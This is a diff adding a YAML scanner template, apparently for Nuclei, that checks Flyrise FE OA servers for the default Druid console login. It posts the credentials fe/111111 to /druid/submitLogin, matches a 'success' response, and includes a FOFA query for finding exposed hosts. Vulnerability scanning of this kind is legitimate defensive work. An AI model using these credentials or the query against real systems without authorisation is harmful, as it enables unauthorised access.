@@ -1,0 +1,28 @@
+id: flyrise-fe-druid-default-login
+
+info:
+  name: 飞企互联 OA druid 默认口令
+  author: qwtd
+  severity: high
+  description: |
+    FOFA: "flyrise.stopBackspace.js"
+  tags: 飞企互联-FE业务协作平台
+
+http:
+  - raw:
+      - |
+        POST /druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+
+        loginUsername=fe&loginPassword=111111
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "^success$"
+
